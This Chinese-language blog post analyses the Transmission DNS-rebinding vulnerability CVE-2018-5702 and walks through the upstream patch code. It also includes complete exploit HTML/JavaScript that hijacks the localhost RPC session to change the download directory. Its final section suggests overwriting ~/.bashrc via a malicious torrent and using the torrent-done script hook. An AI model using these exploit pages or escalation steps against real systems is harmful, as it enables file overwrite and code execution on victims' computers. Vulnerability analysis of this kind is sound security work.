---
layout: post
title:  通过DNS rebinding绕过同源策略攻击Transmission分析
date: 2018-01-23
categories: 漏洞分析
tags:  同源策略 javascript
---


* content
{:toc}

## CVE-2018-5702 简要介绍

通过DNS rebinding绕过同源策略攻击Transmission分析

Transmission 是一种BitTorrent客户端，这款BT下载软件开放源码、接口简洁、有效且支持多平台，默认情况下只对本地请求进行处理。但是Google安全研究员提交了一个通过DNS重绑定绕过同源策略攻击类似软件架构的方法。以下是对这种攻击手段的一点分析。









## transmission架构介绍

transmission是一款使用c/s架构的软件，用户接口是client端，server端用作守护进程，用来控制管理下载，做种上传等

transmission-daemon是Transmission后台守护程序，可以通过Web客户端或者transmission-remote-cli来控制。在Transmission的默认设置中，通过使用选项```"rpc-whitelist": "127.0.0.1","rpc-whitelist-enabled": true,```只对来自127.0.0.1的请求进行处理。`rpc_authentication_required`选项来控制对rpc请求是否进行验证。

## DNS rebinding介绍

DNS是互联网核心协议之一，在一次网络请求中，先根据域名查出IP地址，再向IP地址请求资源。

DNS rebinding 攻击步骤：

1. 当用户第一次请求时，解析域名获取IP地址A；
2. 域名持有者改变域名地址对应IP改为B；
3. 用户再次请求，获取IP地址为B

用户两次请求相同域名获取的IP地址不同，在没有对IP地址做足够验证的情况下，很容易造成安全问题。在此漏洞中，服务端没有对本地请求做权限认证，攻击者可以通过将域名重定向到本地IP，进行攻击

这里有一篇[JoyChou@美联安全](https://mp.weixin.qq.com/s/545el33HNI0rVi2BGVP5_Q)关于DNS rebinding 介绍，原理和代码都很详细。

访问rebind.domain,该域名dns记录会使用ns.domain解析，ns.domain指向对应的那台服务器IP，在这台服务器上运行dns重定向脚本，奇数次返回本地地址127.0.0.1，偶数次返回evil.com攻击者控制的服务器地址

![dns服务器](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/20180123transmission漏洞分析/server_dns.jpg)

dns请求返回

![dns请求结果](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/20180123transmission漏洞分析/request_dns.jpg)


相较于这篇文章的中ssrf绕过，涉及到服务器语言和操作系统上的DNS缓存更新策略，transmission漏洞更专注于浏览器层的缓存策略。服务器设置TTL为0，操作系统层每次请求的服务器获取的IP不同；在浏览器层通常会对DNS进行分钟级缓存，所以DNS rebinding 攻击Transmission中，虽然TTL设置为0，各类DNS服务器没有缓存DNS，也会需要长时间延迟和多次请求，直至IP地址被解析成本地IP。[web浏览器缓存文章](https://dyn.com/blog/web-browser-dns-caching-bad-thing/)

## 漏洞利用代码详解

### 环境复现

环境 UBUNTU xenial (16.04LTS)

安装 `transmission-daemon` 会包含 `transmission-cli`和`transmission-common`等组件
 
在```daemon```关闭的情况下更改配置文件`/etc/transmission-daemon/settings.json`

将`rpc-authentication-required`和`rpc-host-whitelist-enabled`更改为false ,第一个选项`rpc-authentication-required`是rpc服务权限认证，false表示不需要用户名密码认证，第二个选项就是给DNS rebinding攻击的补丁，稍后介绍



### 漏洞利用逻辑

直接访问`http://127.0.0.1:9091/transmission/rpc`
![](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/20180123transmission漏洞分析/409.jpg)

为了防御csrf攻击，类似RPC服务器都在请求中加入了`Session—Id`，

所以正常请求会分成两部分，第一次`GET`请求从服务器返回获取`X-Transmission-Session-Id`的值，第二次请求会将`X-Transmission-Session-Id`及其值加入请求头中，以此完成正常请求，避免csrf攻击。

恶意网站和本地域不相同，所以攻击者如何从恶意网站获取transmission服务返回的session值是关键。

>> 同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的关键的安全机制。

如果非同源，下面三种行为受到限制。

- Cookie、LocalStorage 和 IndexDB 无法读取。
- DOM 无法获得。
- AJAX 请求不能发送。

也就是说需要在一定程度上绕过同源策略的限制

1. 假设用户访问恶意网站`rebind.domain:9091`，`rebind.domain` 被解析为 evil_IP ，攻击者控制的服务器上
2. `rebind.domain:9091/evil.html` 向 `evil.com:9091/transmission/rpc` 发起ajax请求(同源，请求被允许)。
2. 如果此刻`rebind.domain`的dns被解析为`127.0.0.1`,也就是向`http://127.0.0.1:9091/transmission/rpc`发起了请求，绕过了同源策略的限制，访问了只处理来自`127.0.0.1`请求的rpc服务。
4. 获取了返回的session_ID

![](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/20180123transmission漏洞分析/dns_evil.png)


### 漏洞利用代码逻辑


![](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/20180123transmission漏洞分析/DNS_rebinding_attack.png)

注：所有站点使用`http`协议，`rebind.domain-9091`使用`-`替代`：`,使用`websequencediagrams`作图

	1.用户victim访问恶意网站transmission.domain/evil.html
	2.恶意网站返回精心构造的网页内容
	3.恶意网站请求rebind.domain:9091/transmission/rpc
	// transmission.domain与rebind.domain:9091不同域，使用postMessage进行跨域iframe父子窗口通信
	5.transmission.domain使用定时器循环向rebind.domain:9091请求
	6.rebind.domain:9091收到请求，请求自身，使用xmlhttprequest请求网页，获取返回头中的session_Id,如果有session_Id表示此刻DNS解析为本地localhostIP，
	7.如果获得session_Id,则删除transmission.domain中定时器，停止循环
	8.rebind.domain:9091使用session_Id,构造post参数执行任意写



## 补丁

[补丁地址](https://github.com/transmission/transmission/pull/468/files#diff-45154649b8a134b758e28691ed74121b)

可以看到在补丁中，重点围绕着两个参数来做逻辑判断`rpc-host-whitelist`和`rpc-host-whitelist-enabled`，rpc-host白名单和rpc-host白名单开启 两个选项，在`libtransmission/rpc-server.c`文件中，增加了`isHostnameAllowed`函数

函数逻辑很简单

1. 判断是否开启rpc认证(也就是本地访问需要用户名和密码)，如果开启则通过host验证
2. 判断是否开启host白名单，如果关闭host白名单则通过host验证 //默认关闭
3. host为空不通过host验证
4. 允许`localhost`,`localhost.`和IP通过验证
5. 在白名单内的host 通过验证

`isHostnameAllowed`函数：

	static bool isHostnameAllowed(tr_rpc_server const* server, struct evhttp_request* req)
	{
	    /* If password auth is enabled, any hostname is permitted. */
	    if (server->isPasswordEnabled)
	    {
	        return true;
	    }
	
	    /* If whitelist is disabled, no restrictions. */
	    if (!server->isHostWhitelistEnabled)
	    {
	        return true;
	    }
	
	    char const* const host = evhttp_find_header(req->input_headers, "Host");
	
	    /* No host header, invalid request. */
	    if (host == NULL)
	    {
	        return false;
	    }
	
	    /* Host header might include the port. */
	    char* const hostname = tr_strndup(host, strcspn(host, ":"));
	
	    /* localhost or ipaddress is always acceptable. */
	    if (strcmp(hostname, "localhost") == 0 || strcmp(hostname, "localhost.") == 0 || tr_addressIsIP(hostname))
	    {
	        tr_free(hostname);
	        return true;
	    }
	
	    /* Otherwise, hostname must be whitelisted. */
	    for (tr_list* l = server->hostWhitelist; l != NULL; l = l->next)
	    {
	        if (tr_wildmat(hostname, l->data))
	        {
	            tr_free(hostname);
	            return true;
	        }
	    }
	
	    tr_free(hostname);
	    return false;
	}


如果判断host不通过会返回状态码`421 Misdirected Request`,返回内容中对DNS rebinding 攻击进行了描述

    

	<h1>421: Misdirected Request</h1><p>Transmission received your request, but the hostname was unrecognized.</p><p>To fix this, choose one of the following options:<ul><li>Enable password authentication, then any hostname is allowed.</li><li>Add the hostname you want to use to the whitelist in settings.</li></ul></p><p>If you're editing settings.json, see the 'rpc-host-whitelist' and 'rpc-host-whitelist-enabled' entries.</p><p>This requirement has been added to help prevent <a href="https://en.wikipedia.org/wiki/DNS_rebinding">DNS Rebinding</aattacks.</p>


## 代码

 `transmission.domain/evil.html`代码

	<html>
	<title>
	It's evil
	</title>
	<head>
	</head>
	<body>
	Hi It' evil
	<input id=hosturl value= "http://rebind.domain:9091/iframe_A.html" size=64>
	
	<iframe id=iframe_A src="about:blank" height=128 width=50%></iframe>
	
	<script>
	
	function post_iframe_A(){	
		document.getElementById("iframe_A").contentWindow.postMessage("start", "*");
	}
	
	function reload_iframe_A(){
		 document.getElementById("iframe_A").src = document.getElementById("hosturl").value+ "?rnd=" + Math.random();
	}
	
	
	window.addEventListener("message", function( event ) {
		console.log('recieve_from_iframe_A;  ' + event.data);
		if(event.data.status == "stop"){
			clearInterval(timer_reload_iframe_A);
		}
		
		if(event.data.status == "pwned"){
			console.log(event.data.response);
			clearInterval(timer_post_iframe_A);
		}
	});
	 
	timer_reload_iframe_A = setInterval(reload_iframe_A, 10000);
	timer_post_iframe_A = setInterval(post_iframe_A, 5000);	
	</script>
	
	</body>
	</html>



 `rebind.domain:9091/transmission/rpc`代码

	<html>
	<title>
	It's iframe_A
	</title>	
	<body>
	Hi It' iframe_A
	
	<script>	
	function sendRpc(){
		xhr = new XMLHttpRequest();
	    xhr.open("POST", "/transmission/rpc", false);
		console.log('iframe_A_POST_rpc');
		if (sessionid) {
	        xhr.setRequestHeader("X-Transmission-Session-Id", sessionid);
	    }
		command = '{"method":"session-set","arguments":{"download-dir":"/tmp/pwned"}}';
		xhr.send(command);
		if (xhr.status == 200) {
	
	        window.parent.postMessage({status: "pwned", response: xhr.responseText}, "*"); 
			console.log('iframe_A_response:' + xhr.responseText);
	    }
	}
	
	 function getdata(){
					console.log("iframe_A_GET rpc");
					var xhr = new XMLHttpRequest();
					xhr.open("GET","http://rebind.domain:9091/transmission/rpc");
					xhr.send();
					xhr.onreadystatechange = function () {  
						if(xhr.readyState == 4){     
							if(xhr.status == 200){      
								console.log('get_public_ip_iframe_A_response: ' + xhr.responseText);//rescontent 
							}  
							if(xhr.status == 400){
								console.log("error");
								parent.postMessage("go on","*");
							}
							if(xhr.status == 409){
								console.log('get_localhost_ip_iframe_A_response: ' + xhr.responseText);//rescontent
								console.log('iframe_A_response_headers: ' + xhr.getAllResponseHeaders());//resheaders  
								sessionid = xhr.getResponseHeader("X-Transmission-Session-Id");
								sendRpc();
							}
							
						}  
					}
	};
	
	 window.addEventListener("message", function( event ) {
				
				window.parent.postMessage({status: "stop"}, "*"); 
				console.log('receieve_from_evil;   ' + event.data);
				getdata();
	        });		
	
	</script>
	</body>
	</html>

## 注意

web服务器需要设置不缓存  
nginx 添加设置 实例

	http{
		etag off;
		if_modified_since off;
	    add_header Last-Modified "";
	} 


参数设置除了改变下载地址还可以指定下载种子文件，通过种子下载并覆盖指定文件，比如`/home/user/.bashrc`(提前知道用户名称)

	arguments：
		download-dir	/tmp/pwned
		filename	http://xxxxtracker站点/Iambash.torrent
		paused	false
	method	torrent-add

更改参数，种子下载完成执行指定脚本

	"script-torrent-done-enabled": false,
    "script-torrent-done-filename": "",


## 参考链接
	 
1. [CVE-2018-5702 Mitigate dns rebinding attacks against daemon](https://github.com/transmission/transmission/pull/468)	
2. [作者demo地址](http://lock.cmpxchg8b.com/Asoquu3e.html)
3. [360CERT预警分析](https://cert.360.cn/warning/detail?id=0d5c2c3af865a71d0b318488bd0d53f1)
4. [JoyChou@美联安全 DNS rebinding 绕过ssrf](https://mp.weixin.qq.com/s/545el33HNI0rVi2BGVP5_Q)
5. [web浏览器缓存文章](https://dyn.com/blog/web-browser-dns-caching-bad-thing/)


## 转载链接

安全客发布地址[https://www.anquanke.com/post/id/97366](https://www.anquanke.com/post/id/97366)